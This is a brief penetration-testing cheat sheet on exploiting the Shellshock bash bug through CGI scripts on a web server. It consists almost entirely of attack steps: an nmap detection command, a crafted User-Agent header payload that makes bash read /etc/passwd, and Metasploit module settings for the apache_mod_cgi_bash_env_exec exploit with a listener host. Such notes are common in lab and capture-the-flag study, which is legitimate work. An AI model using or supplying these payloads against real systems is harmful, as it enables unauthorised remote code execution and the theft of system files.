# Shellshock

Shellshock (when we find cgi script running on the website)  
▪ nmap --script http-shellshock --script-args "httpshellshock.uri=/gettime.cgi" <target>
• user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'  
• open Burpsuite and run the above command  
• OR msfconsole  
• exploit/multi/http/apache_mod_cgi_bash_env_exec  
• set TARGETURI /gettime.cgi  
• set LHOST eth1  

